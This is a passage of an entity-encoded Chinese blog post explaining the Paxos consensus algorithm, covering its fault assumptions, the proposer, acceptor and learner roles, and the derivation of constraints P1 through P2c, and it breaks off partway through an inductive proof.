Lamport&#xFF0C;LaTeX&#x4E2D;&#x7684;&#x201C;La&#x201D;&#xFF09;&#x4E8E;1990&#x5E74;&#x63D0;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x4E14;&#x5177;&#x6709;&#x9AD8;&#x5EA6;&#x5BB9;&#x9519;&#x7279;&#x6027;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x3002;</p>\n<h2 id=\"&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;\"><a href=\"#&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;\" class=\"headerlink\" title=\"&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;\"></a>&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;</h2><p><strong>&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8282;&#x70B9;&#x901A;&#x4FE1;&#x5B58;&#x5728;&#x4E24;&#x79CD;&#x6A21;&#x578B;&#xFF1A;&#x5171;&#x4EAB;&#x5185;&#x5B58;&#xFF08;Shared memory&#xFF09;&#x548C;&#x6D88;&#x606F;&#x4F20;&#x9012;&#xFF08;Messages passing&#xFF09;</strong>&#x3002;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x901A;&#x4FE1;&#x6A21;&#x578B;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x4F1A;&#x53D1;&#x751F;&#x4EE5;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;&#x8FDB;&#x7A0B;&#x53EF;&#x80FD;&#x4F1A;&#x6162;&#x3001;&#x88AB;&#x6740;&#x6B7B;&#x6216;&#x8005;&#x91CD;&#x542F;&#xFF0C;&#x6D88;&#x606F;&#x53EF;&#x80FD;&#x4F1A;&#x5EF6;&#x8FDF;&#x3001;&#x4E22;&#x5931;&#x3001;&#x91CD;&#x590D;&#xFF0C;&#x5728;&#x57FA;&#x7840;Paxos&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x5148;&#x4E0D;&#x8003;&#x8651;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x6D88;&#x606F;&#x7BE1;&#x6539;&#x5373;<a href=\"https://zh.wikipedia.org/wiki/&#x62DC;&#x5360;&#x5EAD;&#x5C06;&#x519B;&#x95EE;&#x9898;\">&#x62DC;&#x5360;&#x5EAD;&#x9519;&#x8BEF;</a>&#x7684;&#x60C5;&#x51B5;&#x3002;Paxos&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x4E0A;&#x8FF0;&#x5F02;&#x5E38;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x5982;&#x4F55;&#x5C31;&#x67D0;&#x4E2A;&#x503C;&#x8FBE;&#x6210;&#x4E00;&#x81F4;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E0D;&#x8BBA;&#x53D1;&#x751F;&#x4EE5;&#x4E0A;&#x4EFB;&#x4F55;&#x5F02;&#x5E38;&#xFF0C;&#x90FD;&#x4E0D;&#x4F1A;&#x7834;&#x574F;&#x51B3;&#x8BAE;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;<strong>&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x573A;&#x666F;&#x662F;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x5404;&#x8282;&#x70B9;&#x7684;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x4E00;&#x81F4;&#xFF0C;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x90FD;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x64CD;&#x4F5C;&#x5E8F;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x4EEC;&#x6700;&#x540E;&#x80FD;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#x3002;</strong>&#x4E3A;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x547D;&#x4EE4;&#x5E8F;&#x5217;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6BCF;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x4E0A;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x201C;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x201D;&#x4EE5;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x770B;&#x5230;&#x7684;&#x6307;&#x4EE4;&#x4E00;&#x81F4;&#x3002;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x5728;&#x8BB8;&#x591A;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x95EE;&#x9898;&#x3002;&#x56E0;&#x6B64;&#x4ECE;20&#x4E16;&#x7EAA;80&#x5E74;&#x4EE3;&#x8D77;&#x5BF9;&#x4E8E;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x7684;&#x7814;&#x7A76;&#x5C31;&#x6CA1;&#x6709;&#x505C;&#x6B62;&#x8FC7;&#x3002;</p>","more":"<p>&#x4E3A;&#x63CF;&#x8FF0;Paxos&#x7B97;&#x6CD5;&#xFF0C;Lamport&#x865A;&#x62DF;&#x4E86;&#x4E00;&#x4E2A;&#x53EB;&#x505A;Paxos&#x7684;&#x5E0C;&#x814A;&#x57CE;&#x90A6;&#xFF0C;&#x8FD9;&#x4E2A;&#x5C9B;&#x6309;&#x7167;&#x8BAE;&#x4F1A;&#x6C11;&#x4E3B;&#x5236;&#x7684;&#x653F;&#x6CBB;&#x6A21;&#x5F0F;&#x5236;&#x8BA2;&#x6CD5;&#x5F8B;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x4EBA;&#x613F;&#x610F;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x548C;&#x7CBE;&#x529B;&#x653E;&#x5728;&#x8FD9;&#x79CD;&#x4E8B;&#x60C5;&#x4E0A;&#x3002;&#x6240;&#x4EE5;&#x65E0;&#x8BBA;&#x662F;&#x8BAE;&#x5458;&#xFF0C;&#x8BAE;&#x957F;&#x6216;&#x8005;&#x4F20;&#x9012;&#x7EB8;&#x6761;&#x7684;&#x670D;&#x52A1;&#x5458;&#x90FD;&#x4E0D;&#x80FD;&#x627F;&#x8BFA;&#x522B;&#x4EBA;&#x9700;&#x8981;&#x65F6;&#x4E00;&#x5B9A;&#x4F1A;&#x51FA;&#x73B0;&#xFF0C;&#x4E5F;&#x65E0;&#x6CD5;&#x627F;&#x8BFA;&#x6279;&#x51C6;&#x51B3;&#x8BAE;&#x6216;&#x8005;&#x4F20;&#x9012;&#x6D88;&#x606F;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x5047;&#x8BBE;&#x6CA1;&#x6709;&#x62DC;&#x5360;&#x5EAD;&#x5C06;&#x519B;&#x95EE;&#x9898;&#xFF08;Byzantine failure&#xFF0C;&#x5373;&#x867D;&#x7136;&#x6709;&#x53EF;&#x80FD;&#x4E00;&#x4E2A;&#x6D88;&#x606F;&#x88AB;&#x4F20;&#x9012;&#x4E86;&#x4E24;&#x6B21;&#xFF0C;&#x4F46;&#x662F;&#x7EDD;&#x5BF9;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x7684;&#x6D88;&#x606F;&#xFF09;&#xFF1B;&#x53EA;&#x8981;&#x7B49;&#x5F85;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6D88;&#x606F;&#x5C31;&#x4F1A;&#x88AB;&#x4F20;&#x5230;&#x3002;&#x53E6;&#x5916;&#xFF0C;Paxos&#x5C9B;&#x4E0A;&#x7684;&#x8BAE;&#x5458;&#x662F;&#x4E0D;&#x4F1A;&#x53CD;&#x5BF9;&#x5176;&#x4ED6;&#x8BAE;&#x5458;&#x63D0;&#x51FA;&#x7684;&#x51B3;&#x8BAE;&#x7684;&#x3002;</p>\n<p>&#x5BF9;&#x5E94;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x8BAE;&#x5458;&#x5BF9;&#x5E94;&#x4E8E;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x5236;&#x5B9A;&#x7684;&#x6CD5;&#x5F8B;&#x5BF9;&#x5E94;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#x9700;&#x8981;&#x8FDB;&#x5165;&#x4E00;&#x4E2A;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x4F8B;&#x5982;&#x5728;&#x72EC;&#x7ACB;Cache&#x7684;&#x5BF9;&#x79F0;&#x591A;&#x5904;&#x7406;&#x5668;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5404;&#x4E2A;&#x5904;&#x7406;&#x5668;&#x8BFB;&#x5185;&#x5B58;&#x7684;&#x67D0;&#x4E2A;&#x5B57;&#x8282;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x8BFB;&#x5230;&#x540C;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x5426;&#x5219;&#x7CFB;&#x7EDF;&#x5C31;&#x8FDD;&#x80CC;&#x4E86;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x8981;&#x6C42;&#x3002;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#x5BF9;&#x5E94;&#x4E8E;&#x6CD5;&#x5F8B;&#x6761;&#x6587;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x3002;&#x8BAE;&#x5458;&#x548C;&#x670D;&#x52A1;&#x5458;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#x5BF9;&#x5E94;&#x4E8E;&#x8282;&#x70B9;&#x548C;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x901A;&#x9053;&#x7684;&#x4E0D;&#x53EF;&#x9760;&#x6027;&#x3002;</p>\n<hr>\n<h2 id=\"&#x7B97;&#x6CD5;\"><a href=\"#&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;\"></a>&#x7B97;&#x6CD5;</h2><h3 id=\"&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;\"><a href=\"#&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;\"></a>&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;</h3><p>&#x9996;&#x5148;&#x5C06;&#x8BAE;&#x5458;&#x7684;&#x89D2;&#x8272;&#x5206;&#x4E3A;proposers&#xFF0C;acceptors&#xFF0C;&#x548C;learners&#xFF08;&#x5141;&#x8BB8;&#x8EAB;&#x517C;&#x6570;&#x804C;&#xFF09;&#x3002;proposers&#x63D0;&#x51FA;&#x63D0;&#x6848;&#xFF0C;&#x63D0;&#x6848;&#x4FE1;&#x606F;&#x5305;&#x62EC;&#x63D0;&#x6848;&#x7F16;&#x53F7;&#x548C;&#x63D0;&#x8BAE;&#x7684;value&#xFF1B;acceptor&#x6536;&#x5230;&#x63D0;&#x6848;&#x540E;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x63D0;&#x6848;&#xFF0C;&#x82E5;&#x63D0;&#x6848;&#x83B7;&#x5F97;&#x591A;&#x6570;acceptors&#x7684;&#x63A5;&#x53D7;&#xFF0C;&#x5219;&#x79F0;&#x8BE5;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF1B;learners&#x53EA;&#x80FD;&#x201C;&#x5B66;&#x4E60;&#x201D;&#x88AB;&#x6279;&#x51C6;&#x7684;&#x63D0;&#x6848;&#x3002;&#x5212;&#x5206;&#x89D2;&#x8272;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x66F4;&#x7CBE;&#x786E;&#x7684;&#x5B9A;&#x4E49;&#x95EE;&#x9898;&#xFF1A;</p>\n<ul>\n<li>&#x51B3;&#x8BAE;&#xFF08;value&#xFF09;&#x53EA;&#x6709;&#x5728;&#x88AB;proposers&#x63D0;&#x51FA;&#x540E;&#x624D;&#x80FD;&#x88AB;&#x6279;&#x51C6;&#xFF08;&#x672A;&#x7ECF;&#x6279;&#x51C6;&#x7684;&#x51B3;&#x8BAE;&#x79F0;&#x4E3A;&#x201C;&#x63D0;&#x6848;&#xFF08;proposal&#xFF09;&#x201D;&#xFF09;&#xFF1B;</li>\n<li>&#x5728;&#x4E00;&#x6B21;Paxos&#x7B97;&#x6CD5;&#x7684;&#x6267;&#x884C;&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x53EA;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x4E00;&#x4E2A;value&#xFF1B;</li>\n<li>learners&#x53EA;&#x80FD;&#x83B7;&#x5F97;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x7684;value&#x3002;</li>\n</ul>\n<p>&#x53E6;&#x5916;&#x8FD8;&#x9700;&#x8981;&#x4FDD;&#x8BC1;progress&#x3002;&#x8FD9;&#x4E00;&#x70B9;&#x4EE5;&#x540E;&#x518D;&#x8BA8;&#x8BBA;&#x3002;</p>\n<p>&#x4F5C;&#x8005;&#x901A;&#x8FC7;&#x4E0D;&#x65AD;&#x52A0;&#x5F3A;&#x4E0A;&#x8FF0;3&#x4E2A;&#x7EA6;&#x675F;&#xFF08;&#x4E3B;&#x8981;&#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#xFF09;&#x83B7;&#x5F97;&#x4E86;Paxos&#x7B97;&#x6CD5;&#x3002;</p>\n<p>&#x6279;&#x51C6;value&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9996;&#x5148;proposers&#x5C06;value&#x53D1;&#x9001;&#x7ED9;acceptors&#xFF0C;&#x4E4B;&#x540E;acceptors&#x5BF9;value&#x8FDB;&#x884C;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x3002;&#x4E3A;&#x4E86;&#x6EE1;&#x8DB3;&#x53EA;&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x7684;&#x7EA6;&#x675F;&#xFF0C;&#x8981;&#x6C42;&#x7ECF;&#x201C;&#x591A;&#x6570;&#x6D3E;&#xFF08;majority&#xFF09;&#x201D;&#x63A5;&#x53D7;&#x7684;value&#x6210;&#x4E3A;&#x6B63;&#x5F0F;&#x7684;&#x51B3;&#x8BAE;&#xFF08;&#x79F0;&#x4E3A;&#x201C;&#x6279;&#x51C6;&#x201D;&#x51B3;&#x8BAE;&#xFF09;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x65E0;&#x8BBA;&#x662F;&#x6309;&#x7167;&#x4EBA;&#x6570;&#x8FD8;&#x662F;&#x6309;&#x7167;&#x6743;&#x91CD;&#x5212;&#x5206;&#xFF0C;&#x4E24;&#x7EC4;&#x201C;&#x591A;&#x6570;&#x6D3E;&#x201D;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x5982;&#x679C;&#x6BCF;&#x4E2A;acceptor&#x53EA;&#x80FD;&#x63A5;&#x53D7;&#x4E00;&#x4E2A;value&#xFF0C;&#x7EA6;&#x675F;2&#x5C31;&#x80FD;&#x4FDD;&#x8BC1;&#x3002;</p>\n<p>&#x4E8E;&#x662F;&#x4EA7;&#x751F;&#x4E86;&#x4E00;&#x4E2A;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x65B0;&#x7EA6;&#x675F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P1&#xFF1A;&#x4E00;&#x4E2A;acceptor&#x5FC5;&#x987B;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7B2C;&#x4E00;&#x6B21;&#x6536;&#x5230;&#x7684;&#x63D0;&#x6848;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x6CE8;&#x610F;P1&#x662F;&#x4E0D;&#x5B8C;&#x5907;&#x7684;&#x3002;&#x5982;&#x679C;&#x6070;&#x597D;&#x4E00;&#x534A;acceptor&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value A&#xFF0C;&#x53E6;&#x4E00;&#x534A;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value B&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x65E0;&#x6CD5;&#x5F62;&#x6210;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x65E0;&#x6CD5;&#x6279;&#x51C6;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;value&#x3002;</p>\n<p>&#x7EA6;&#x675F;2&#x5E76;&#x4E0D;&#x8981;&#x6C42;&#x53EA;&#x6279;&#x51C6;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF0C;&#x6697;&#x793A;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x63D0;&#x6848;&#x3002;&#x53EA;&#x8981;&#x63D0;&#x6848;&#x7684;value&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x6279;&#x51C6;&#x591A;&#x4E2A;&#x63D0;&#x6848;&#x4E0D;&#x8FDD;&#x80CC;&#x7EA6;&#x675F;2&#x3002;&#x4E8E;&#x662F;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x7EA6;&#x675F;P2&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4E4B;&#x540E;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>&#x6CE8;&#xFF1A;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x4E3A;&#x6BCF;&#x4E2A;&#x63D0;&#x6848;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#xFF0C;&#x5728;&#x63D0;&#x6848;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x5168;&#x5E8F;&#x5173;&#x7CFB;&#xFF0C;&#x6240;&#x8C13;&#x201C;&#x4E4B;&#x540E;&#x201D;&#x90FD;&#x662F;&#x6307;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x3002;</p>\n</blockquote>\n<p>&#x5982;&#x679C;P1&#x548C;P2&#x90FD;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#xFF0C;&#x90A3;&#x4E48;&#x7EA6;&#x675F;2&#x5C31;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x3002;</p>\n<p>&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x610F;&#x5473;&#x7740;&#x591A;&#x4E2A;acceptor&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;&#x8BE5;value.&#x56E0;&#x6B64;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;P2&#x8FDB;&#x884C;&#x52A0;&#x5F3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2a&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4E4B;&#x540E;&#x4EFB;&#x4F55;acceptor&#x518D;&#x6B21;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x7531;&#x4E8E;&#x901A;&#x4FE1;&#x662F;&#x5F02;&#x6B65;&#x7684;&#xFF0C;P2a&#x548C;P1&#x4F1A;&#x53D1;&#x751F;&#x51B2;&#x7A81;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;value&#x88AB;&#x6279;&#x51C6;&#x540E;&#xFF0C;&#x4E00;&#x4E2A;proposer&#x548C;&#x4E00;&#x4E2A;acceptor&#x4ECE;&#x4F11;&#x7720;&#x4E2D;&#x82CF;&#x9192;&#xFF0C;&#x524D;&#x8005;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x65B0;&#x7684;value&#x7684;&#x63D0;&#x6848;&#x3002;&#x6839;&#x636E;P1&#xFF0C;&#x540E;&#x8005;&#x5E94;&#x5F53;&#x63A5;&#x53D7;&#xFF0C;&#x6839;&#x636E;P2a&#xFF0C;&#x5219;&#x4E0D;&#x5E94;&#x5F53;&#x63A5;&#x53D7;&#xFF0C;&#x8FD9;&#x4E2D;&#x573A;&#x666F;&#x4E0B;P2a&#x548C;P1&#x6709;&#x77DB;&#x76FE;&#x3002;&#x4E8E;&#x662F;&#x9700;&#x8981;&#x6362;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x8F6C;&#x800C;&#x5BF9;proposer&#x7684;&#x884C;&#x4E3A;&#x8FDB;&#x884C;&#x7EA6;&#x675F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2b&#xFF1A;&#x4E00;&#x65E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x4EE5;&#x540E;&#x4EFB;&#x4F55;proposer&#x63D0;&#x51FA;&#x7684;&#x63D0;&#x6848;&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x7531;&#x4E8E;acceptor&#x80FD;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x90FD;&#x5FC5;&#x987B;&#x7531;proposer&#x63D0;&#x51FA;&#xFF0C;&#x6240;&#x4EE5;P2b&#x8574;&#x6DB5;&#x4E86;P2a&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x66F4;&#x5F3A;&#x7684;&#x7EA6;&#x675F;&#x3002;<br>&#x4F46;&#x662F;&#x6839;&#x636E;P2b&#x96BE;&#x4EE5;&#x63D0;&#x51FA;&#x5B9E;&#x73B0;&#x624B;&#x6BB5;&#x3002;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x8FDB;&#x4E00;&#x6B65;&#x52A0;&#x5F3A;P2b&#x3002;</p>\n<p>&#x5047;&#x8BBE;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x4E3A;m&#x7684;value v&#x5DF2;&#x7ECF;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x6765;&#x770B;&#x770B;&#x5728;&#x4EC0;&#x4E48;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4EFB;&#x4F55;&#x7F16;&#x53F7;&#x4E3A;n&#xFF08;n&gt;m&#xFF09;&#x7684;&#x63D0;&#x6848;&#x90FD;&#x542B;&#x6709;value v&#x3002;&#x56E0;&#x4E3A;m&#x5DF2;&#x7ECF;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x663E;&#x7136;&#x5B58;&#x5728;&#x4E00;&#x4E2A;acceptors&#x7684;&#x591A;&#x6570;&#x6D3E;C&#xFF0C;&#x4ED6;&#x4EEC;&#x90FD;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;v&#x3002;&#x8003;&#x8651;&#x5230;&#x4EFB;&#x4F55;&#x591A;&#x6570;&#x6D3E;&#x90FD;&#x548C;C&#x5177;&#x6709;&#x81F3;&#x5C11;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x6210;&#x5458;&#xFF0C;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x8574;&#x6DB5;P2b&#x7684;&#x7EA6;&#x675F;P2c&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P2c&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x4E3A;n&#x7684;&#x63D0;&#x6848;&#x5177;&#x6709;value v&#xFF0C;&#x90A3;&#x4E48;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x4E2D;&#x6240;&#x6709;&#x4EBA;&#x90FD;&#x6CA1;&#x6709;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n </span><br><span class=\"line\">&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x5177;&#x6709;value v&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x53EF;&#x4EE5;&#x7528;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#x8BC1;&#x660E;P2c&#x8574;&#x6DB5;P2b&#xFF1A;</strong><br>&#x5047;&#x8BBE;&#x5177;&#x6709;value v&#x7684;&#x63D0;&#x6848;m&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF0C;&#x5F53;n=m+1&#x65F6;&#xFF0C;&#x91C7;&#x7528;&#x53CD;&#x8BC1;&#x6CD5;&#xFF0C;&#x5047;&#x5982;&#x63D0;&#x6848;n&#x4E0D;&#x5177;&#x6709;value v&#xFF0C;&#x800C;&#x662F;&#x5177;&#x6709;value w&#xFF0C;&#x6839;&#x636E;P2c&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;S1&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x4E2D;&#x6CA1;&#x6709;&#x4EBA;&#x63A5;&#x53D7;&#x8FC7;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x662F;value 